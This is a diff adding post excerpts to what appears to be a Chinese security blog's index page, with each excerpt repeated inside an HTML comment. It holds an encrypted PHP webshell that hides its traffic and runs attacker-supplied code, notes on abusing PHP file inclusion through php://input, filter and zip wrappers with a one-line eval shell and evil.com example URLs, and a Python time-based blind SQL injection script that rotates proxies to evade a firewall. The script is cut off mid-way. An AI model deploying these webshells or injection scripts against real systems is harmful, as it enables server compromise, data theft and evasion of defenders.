@@ -117,6 +117,506 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2017/01/04/加密webshell流量.html" >加密webshell流量</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2017-01-04  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+function easy_en($str) &#123;
+    $ret &#x3D; &quot;&quot;;
+    for ($i&#x3D;0;$i&lt;strlen($str);$i++)&#123;
+        $old &#x3D; ord($str[$i]);
+        if ($old &#x3D;&#x3D; 0) $new &#x3D; 0x7f;
+        else $new &#x3D; $old -1;
+        $ret .&#x3D; chr($new);
+    &#125;
+    return $ret;
+&#125;
+
+function easy_de($str) &#123;
+    $ret &#x3D; &quot;&quot;;
+    for ($i&#x3D;0;$i&lt;strlen($str);$i++)&#123;
+        $old &#x3D; ord($str[$i]);
+        if ($old &#x3D;&#x3D; 0x7f) $new &#x3D; 0;
+        else $new &#x3D; $old + 1;
+        $ret .&#x3D; chr($new);
+    &#125;
+    return $ret;
+&#125;
+
+if (@$_GET[&#39;role&#39;] &#x3D;&#x3D; &#39;proxy&#39; &amp;&amp; @$_GET[&#39;url&#39;]) &#123;
+    $c &#x3D; base64_encode(easy_en(file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;)));
+&#x2F;&#x2F;    var_dump($c);
+    $cxt &#x3D; stream_context_create(array(&#39;http&#39;&#x3D;&gt;array(
+        &#39;header&#39;&#x3D;&gt;&#39;Content-Type: application&#x2F;x-www-form-urlencoded&#39;,
+        &#39;method&#39;&#x3D;&gt;&#39;POST&#39;,
+        &#39;content&#39;&#x3D;&gt;$c),
+    ));
+    $c &#x3D; file_get_contents($_GET[&#39;url&#39;], false, $cxt);
+&#x2F;&#x2F;    var_dump($c);
+    die(easy_de(base64_decode($c)));
+&#125;
+
+function shutdown() &#123;
+    $str &#x3D; ob_get_contents();
+    ob_end_clean();
+    echo base64_encode(easy_en($str));
+&#125;
+
+register_shutdown_function(&quot;shutdown&quot;);
+ob_start();
+$c &#x3D; easy_de(base64_decode(file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;)));
+parse_str($c, $_POST); &#x2F;&#x2F;解密之后把pass赋值给$_POST参数
+eval($_POST[&#39;pass&#39;]);  &#x2F;&#x2F;执行一句话
+?&gt;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	
+
+	</div>
+  <a type="button" href="/2017/01/04/加密webshell流量.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+function easy_en($str) &#123;
+    $ret &#x3D; &quot;&quot;;
+    for ($i&#x3D;0;$i&lt;strlen($str);$i++)&#123;
+        $old &#x3D; ord($str[$i]);
+        if ($old &#x3D;&#x3D; 0) $new &#x3D; 0x7f;
+        else $new &#x3D; $old -1;
+        $ret .&#x3D; chr($new);
+    &#125;
+    return $ret;
+&#125;
+
+function easy_de($str) &#123;
+    $ret &#x3D; &quot;&quot;;
+    for ($i&#x3D;0;$i&lt;strlen($str);$i++)&#123;
+        $old &#x3D; ord($str[$i]);
+        if ($old &#x3D;&#x3D; 0x7f) $new &#x3D; 0;
+        else $new &#x3D; $old + 1;
+        $ret .&#x3D; chr($new);
+    &#125;
+    return $ret;
+&#125;
+
+if (@$_GET[&#39;role&#39;] &#x3D;&#x3D; &#39;proxy&#39; &amp;&amp; @$_GET[&#39;url&#39;]) &#123;
+    $c &#x3D; base64_encode(easy_en(file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;)));
+&#x2F;&#x2F;    var_dump($c);
+    $cxt &#x3D; stream_context_create(array(&#39;http&#39;&#x3D;&gt;array(
+        &#39;header&#39;&#x3D;&gt;&#39;Content-Type: application&#x2F;x-www-form-urlencoded&#39;,
+        &#39;method&#39;&#x3D;&gt;&#39;POST&#39;,
+        &#39;content&#39;&#x3D;&gt;$c),
+    ));
+    $c &#x3D; file_get_contents($_GET[&#39;url&#39;], false, $cxt);
+&#x2F;&#x2F;    var_dump($c);
+    die(easy_de(base64_decode($c)));
+&#125;
+
+function shutdown() &#123;
+    $str &#x3D; ob_get_contents();
+    ob_end_clean();
+    echo base64_encode(easy_en($str));
+&#125;
+
+register_shutdown_function(&quot;shutdown&quot;);
+ob_start();
+$c &#x3D; easy_de(base64_decode(file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;)));
+parse_str($c, $_POST); &#x2F;&#x2F;解密之后把pass赋值给$_POST参数
+eval($_POST[&#39;pass&#39;]);  &#x2F;&#x2F;执行一句话
+?&gt;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	
+	</div>
+  <a type="button" href="/2017/01/04/加密webshell流量.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2017/01/03/sql中转.html" >Sqlmap备忘录</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2017-01-03  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>2017-1-11更新：<br>原来的时候下面这一坨代码用了半个小时写出来，PHP比较渣，变查边写边用burp调试。</p>
+<p>其实需求很简单，就是在sqlmap的每个payload后面写入特定字符，昨天的时候看到这篇文章才发现sqlmap已经有选项了，感觉自己蠢蠢嗒- -</p>
+<p><a target="_blank" rel="noopener" href="http://www.thegreycorner.com/2017/01/exploiting-difficult-sql-injection.html">http://www.thegreycorner.com/2017/01/exploiting-difficult-sql-injection.html</a></p>
+<blockquote>
+<p>The prefix (–prefix) and suffix (–suffix) options configure the strings that should be included with each SQL injection payload in order to begin, and then terminate, the Injection. </p>
+</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">--prefix --suffix 是每次添加在payload的数据，一个前置，一个后置<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>###在注入测试的时候union查询用的是NULL?</p>
+<blockquote>
+<p>Why use NULL values in the UNION SELECT? NULL is a great value to use in UNIONS when trying to determine the correct number of columns in an injection, as it can sit in place of a number of different field types, such as numbers, strings and dates.</p>
+</blockquote>
+<p>###使用具体的payload<br>如果知道了注入点是在order by，可以添加这样的选项:<code>--test-filter=&#39;ORDER BY&#39;</code></p>
+<p>###<code>--string</code> &amp; <code>--not-string</code><br>Blind injection的时候，有这样的选项：</p>
+<pre class="line-numbers language-none"><code class="language-none">--string
+--not-string
+在true或者false要判断的字符
+
+--regexp 使用的正则表达
+--code 根据HTTP状态来判断
+--text-only 比较回应的文本
+--title 比较回应的title
+
+其中作者说明了使用--string或者--not-string的时候可以使用Python里面的十六进制换行来匹配比如newline(\x0a)和tabs(\x09)
+
+--string&#x3D;&quot;Name\x0a\x09\x09Stephen&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	
+
+	</div>
+  <a type="button" href="/2017/01/03/sql中转.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>2017-1-11更新：<br>原来的时候下面这一坨代码用了半个小时写出来，PHP比较渣，变查边写边用burp调试。</p>
+<p>其实需求很简单，就是在sqlmap的每个payload后面写入特定字符，昨天的时候看到这篇文章才发现sqlmap已经有选项了，感觉自己蠢蠢嗒- -</p>
+<p><a target="_blank" rel="noopener" href="http://www.thegreycorner.com/2017/01/exploiting-difficult-sql-injection.html">http://www.thegreycorner.com/2017/01/exploiting-difficult-sql-injection.html</a></p>
+<blockquote>
+<p>The prefix (–prefix) and suffix (–suffix) options configure the strings that should be included with each SQL injection payload in order to begin, and then terminate, the Injection. </p>
+</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">--prefix --suffix 是每次添加在payload的数据，一个前置，一个后置<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>###在注入测试的时候union查询用的是NULL?</p>
+<blockquote>
+<p>Why use NULL values in the UNION SELECT? NULL is a great value to use in UNIONS when trying to determine the correct number of columns in an injection, as it can sit in place of a number of different field types, such as numbers, strings and dates.</p>
+</blockquote>
+<p>###使用具体的payload<br>如果知道了注入点是在order by，可以添加这样的选项:<code>--test-filter=&#39;ORDER BY&#39;</code></p>
+<p>###<code>--string</code> &amp; <code>--not-string</code><br>Blind injection的时候，有这样的选项：</p>
+<pre class="line-numbers language-none"><code class="language-none">--string
+--not-string
+在true或者false要判断的字符
+
+--regexp 使用的正则表达
+--code 根据HTTP状态来判断
+--text-only 比较回应的文本
+--title 比较回应的title
+
+其中作者说明了使用--string或者--not-string的时候可以使用Python里面的十六进制换行来匹配比如newline(\x0a)和tabs(\x09)
+
+--string&#x3D;&quot;Name\x0a\x09\x09Stephen&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	
+	</div>
+  <a type="button" href="/2017/01/03/sql中转.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2016/12/28/php的zip伪协议.html" >php://input&amp;&amp;php://filter</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2016-12-28  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>php://input需要服务器的支持，同时要求”allow_url_include”设置为On，在PHP的配置文件php.ini配置。对于一个LFI产生的漏洞比如：</p>
+<pre class="line-numbers language-none"><code class="language-none">index.php:
+
+&lt;?php
+    $b&#x3D;$_REQUEST[&quot;b&quot;];
+    @include($b);
+ ?&gt;
+ 
+EXP:
+
+GET http:&#x2F;&#x2F;evil.com&#x2F;index.php?php:&#x2F;&#x2F;input
+&lt;?php system(&quot;id&quot;)?&gt;
+
+获取文件内容：
+&lt;?php echo file_get_contents(&quot;info.php&quot;);?&gt; &#x2F;&#x2F;测试可用
+&lt;?php echo base64_encode(file_get_contents(&quot;info.php&quot;));?&gt;  &#x2F;&#x2F;http:&#x2F;&#x2F;www.cnblogs.com&#x2F;LittleHann&#x2F;p&#x2F;3665062.html 防止获取&#96;.php&#96;文件的时候php执行，先base64编码下，但是实际测试上述即可用。php在4点多的版本使用这个可以读出来
+
+
+fimap.py 类似sqlmap.py，用来文件包含扫描，可以获取一个交互shell
+另外一个php伪协议：
+ 
+file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;image.php
+用来读取php文件。
+ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><code>$_FILES[“file”][“type”]</code><br>这个参数是浏览器生成传递给服务端的，虽然不是用户输入数据，但是是属于客户端传递过来的数据，也就是用户其实是可以控制这个参数的。只需要修改Content-Type: image/jpeg 就可以绕过这个检查，上传任意类型的文件。</p>
+<h3 id="php的zip伪协议"><a href="#php的zip伪协议" class="headerlink" title="php的zip伪协议"></a>php的zip伪协议</h3><p>假设有以下的代码：</p>
+<pre class="line-numbers language-none"><code class="language-none">file.php:
+
+&lt;?php
+@include($_GET[&#39;a&#39;].&quot;.jpg&quot;);
+@include($_GET[&#39;b&#39;].&quot;.php&quot;);
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>明细的包含，对于参数a和参数b可以这样来解决，比如有一个</p>
+<pre class="line-numbers language-none"><code class="language-none">shell.php:
+
+&lt;?php eval($_GET[&#39;c&#39;]);?&gt;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>a参数最终包含的是一个jpg，b参数是一个php</p>
+<pre class="line-numbers language-none"><code class="language-none">对于a来说：
+mv shell.php shell.jpg
+zip a.zip shell.jpg
+
+访问: http:&#x2F;&#x2F;evil.com&#x2F;file.php?a&#x3D;zip:&#x2F;&#x2F;a.zip%23shell&amp;c&#x3D;phpinfo();
+
+对于b来说：
+zip b.zip shell.php
+
+访问: http:&#x2F;&#x2F;evil.com&#x2F;file.php?b&#x3D;zip:&#x2F;&#x2F;b.zip%23shell&amp;c&#x3D;phpinfo();
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	
+
+	</div>
+  <a type="button" href="/2016/12/28/php的zip伪协议.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>php://input需要服务器的支持，同时要求”allow_url_include”设置为On，在PHP的配置文件php.ini配置。对于一个LFI产生的漏洞比如：</p>
+<pre class="line-numbers language-none"><code class="language-none">index.php:
+
+&lt;?php
+    $b&#x3D;$_REQUEST[&quot;b&quot;];
+    @include($b);
+ ?&gt;
+ 
+EXP:
+
+GET http:&#x2F;&#x2F;evil.com&#x2F;index.php?php:&#x2F;&#x2F;input
+&lt;?php system(&quot;id&quot;)?&gt;
+
+获取文件内容：
+&lt;?php echo file_get_contents(&quot;info.php&quot;);?&gt; &#x2F;&#x2F;测试可用
+&lt;?php echo base64_encode(file_get_contents(&quot;info.php&quot;));?&gt;  &#x2F;&#x2F;http:&#x2F;&#x2F;www.cnblogs.com&#x2F;LittleHann&#x2F;p&#x2F;3665062.html 防止获取&#96;.php&#96;文件的时候php执行，先base64编码下，但是实际测试上述即可用。php在4点多的版本使用这个可以读出来
+
+
+fimap.py 类似sqlmap.py，用来文件包含扫描，可以获取一个交互shell
+另外一个php伪协议：
+ 
+file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;image.php
+用来读取php文件。
+ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><code>$_FILES[“file”][“type”]</code><br>这个参数是浏览器生成传递给服务端的，虽然不是用户输入数据，但是是属于客户端传递过来的数据，也就是用户其实是可以控制这个参数的。只需要修改Content-Type: image/jpeg 就可以绕过这个检查，上传任意类型的文件。</p>
+<h3 id="php的zip伪协议"><a href="#php的zip伪协议" class="headerlink" title="php的zip伪协议"></a>php的zip伪协议</h3><p>假设有以下的代码：</p>
+<pre class="line-numbers language-none"><code class="language-none">file.php:
+
+&lt;?php
+@include($_GET[&#39;a&#39;].&quot;.jpg&quot;);
+@include($_GET[&#39;b&#39;].&quot;.php&quot;);
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>明细的包含，对于参数a和参数b可以这样来解决，比如有一个</p>
+<pre class="line-numbers language-none"><code class="language-none">shell.php:
+
+&lt;?php eval($_GET[&#39;c&#39;]);?&gt;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>a参数最终包含的是一个jpg，b参数是一个php</p>
+<pre class="line-numbers language-none"><code class="language-none">对于a来说：
+mv shell.php shell.jpg
+zip a.zip shell.jpg
+
+访问: http:&#x2F;&#x2F;evil.com&#x2F;file.php?a&#x3D;zip:&#x2F;&#x2F;a.zip%23shell&amp;c&#x3D;phpinfo();
+
+对于b来说：
+zip b.zip shell.php
+
+访问: http:&#x2F;&#x2F;evil.com&#x2F;file.php?b&#x3D;zip:&#x2F;&#x2F;b.zip%23shell&amp;c&#x3D;phpinfo();
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	
+	</div>
+  <a type="button" href="/2016/12/28/php的zip伪协议.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2016/11/08/sql-proxy.html" >Sql代理注入</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2016-11-08  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>
+<span class="token comment"># coding: utf-8</span>
+
+<span class="token keyword">import</span> requests
+<span class="token keyword">import</span> time
+
+target <span class="token operator">=</span> <span class="token string">'http://www.vulnerable.com'</span>
+headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+	<span class="token string">"Host"</span><span class="token punctuation">:</span> <span class="token string">"www.vulnerable.com"</span><span class="token punctuation">,</span>
+	<span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0"</span> <span class="token punctuation">,</span>
+	<span class="token string">'Connection'</span><span class="token punctuation">:</span> <span class="token string">'close'</span><span class="token punctuation">,</span>
+	<span class="token string">"Accept-Language"</span><span class="token punctuation">:</span> <span class="token string">"zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3"</span>
+<span class="token punctuation">&#125;</span>
+
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+	cookies <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"PHPSESSID"</span><span class="token punctuation">:</span> <span class="token string">"f4udpabdluoed7ldhfp90"</span><span class="token punctuation">&#125;</span>
+	payload <span class="token operator">=</span> <span class="token string">"1' or select if(length(user())=&#123;&#125;,sleep(15),1) or '1'='1"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
+	data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span> <span class="token string">"userpwd"</span><span class="token punctuation">:</span> <span class="token string">"abc"</span><span class="token punctuation">&#125;</span>
+
+	<span class="token keyword">def</span> <span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+		<span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
+			r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://127.0.0.1:1111/time&lt;4"</span><span class="token punctuation">)</span>
+			proxy <span class="token operator">=</span> r<span class="token punctuation">.</span>content<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">"[\"]"</span><span class="token punctuation">)</span>
+			ab <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
+			<span class="token keyword">try</span><span class="token punctuation">:</span>
+				test <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://www.vulnerable.com"</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> proxies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"http"</span><span class="token punctuation">:</span> proxy<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>
+				<span class="token keyword">if</span> test<span class="token punctuation">.</span>content<span class="token punctuation">:</span>
+					<span class="token keyword">return</span> <span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> ab<span class="token punctuation">)</span><span class="token punctuation">,</span> proxy
+			<span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
+				<span class="token keyword">pass</span>
+
+	<span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
+		testtime<span class="token punctuation">,</span> proxy <span class="token operator">=</span> val<span class="token punctuation">(</span><span class="token punctuation">)</span>
+		now <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
+		<span class="token keyword">try</span><span class="token punctuation">:</span>
+			req <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>target<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> proxies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"http"</span><span class="token punctuation">:</span> proxy<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">200</span><span class="token punctuation">)</span>
+			<span class="token keyword">if</span> req<span class="token punctuation">.</span>content<span class="token punctuation">:</span>
+				<span class="token keyword">print</span> <span class="token string">"[*]i:%s, before:%s, now:%s, Cost:%s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> now<span class="token punctuation">,</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>now<span class="token punctuation">)</span>
+				<span class="token keyword">print</span> <span class="token string">"[*]proxy:%s, Content:%s, Testtime:%s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>proxy<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token punctuation">,</span> testtime<span class="token punctuation">)</span>
+				<span class="token keyword">print</span> <span class="token string">"[*]TimeCompare: %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>now<span class="token punctuation">)</span> <span class="token operator">-</span> testtime<span class="token punctuation">)</span>
+				<span class="token keyword">print</span> <span class="token string">"="</span> <span class="token operator">*</span> <span class="token number">30</span>
+				<span class="token keyword">break</span>
+		<span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
+			<span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>开个proxypool.py，然后<code>http://127.0.0.1:1111/time&lt;4</code>找个稍微好点的代理，就这样循环下去吧，这样每次请求目标之后，都会切换到下个代理。所以就不会触发防火墙啦，具体效果再说。</p>
+<p>实测还没测出来，感觉有点悬。</p>
+
+	
+
+	</div>
+  <a type="button" href="/2016/11/08/sql-proxy.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>
+<span class="token comment"># coding: utf-8</span>
+
+<span class="token keyword">import</span> requests
+<span class="token keyword">import</span> time
+
+target <span class="token operator">=</span> <span class="token string">'http://www.vulnerable.com'</span>
+headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+	<span class="token string">"Host"</span><span class="token punctuation">:</span> <span class="token string">"www.vulnerable.com"</span><span class="token punctuation">,</span>
+	<span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0"</span> <span class="token punctuation">,</span>
+	<span class="token string">'Connection'</span><span class="token punctuation">:</span> <span class="token string">'close'</span><span class="token punctuation">,</span>
+	<span class="token string">"Accept-Language"</span><span class="token punctuation">:</span> <span class="token string">"zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3"</span>
+<span class="token punctuation">&#125;</span>
+
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+	cookies <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"PHPSESSID"</span><span class="token punctuation">:</span> <span class="token string">"f4udpabdluoed7ldhfp90"</span><span class="token punctuation">&#125;</span>
+	payload <span class="token operator">=</span> <span class="token string">"1' or select if(length(user())=&#123;&#125;,sleep(15),1) or '1'='1"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
+	data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span> <span class="token string">"userpwd"</span><span class="token punctuation">:</span> <span class="token string">"abc"</span><span class="token punctuation">&#125;</span>
+
+	<span class="token keyword">def</span> <span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+		<span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
+			r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://127.0.0.1:1111/time&lt;4"</span><span class="token punctuation">)</span>
+			proxy <span class="token operator">=</span> r<span class="token punctuation">.</span>content<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">"[\"]"</span><span class="token punctuation">)</span>
+			ab <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
+			<span class="token keyword">try</span><span class="token punctuation">:</span>
+				test <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://www.vulnerable.com"</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> proxies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"http"</span><span class="token punctuation">:</span> proxy<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>
+				<span class="token keyword">if</span> test<span class="token punctuation">.</span>content<span class="token punctuation">:</span>
+					<span class="token keyword">return</span> <span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> ab<span class="token punctuation">)</span><span class="token punctuation">,</span> proxy
+			<span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
+				<span class="token keyword">pass</span>
+
+	<span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
+		testtime<span class="token punctuation">,</span> proxy <span class="token operator">=</span> val<span class="token punctuation">(</span><span class="token punctuation">)</span>
+		now <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
+		<span class="token keyword">try</span><span class="token punctuation">:</span>
+			req <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>target<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> proxies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"http"</span><span class="token punctuation">:</span> proxy<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">200</span><span class="token punctuation">)</span>
+			<span class="token keyword">if</span> req<span class="token punctuation">.</span>content<span class="token punctuation">:</span>
+				<span class="token keyword">print</span> <span class="token string">"[*]i:%s, before:%s, now:%s, Cost:%s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> now<span class="token punctuation">,</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>now<span class="token punctuation">)</span>
+				<span class="token keyword">print</span> <span class="token string">"[*]proxy:%s, Content:%s, Testtime:%s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>proxy<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token punctuation">,</span> testtime<span class="token punctuation">)</span>
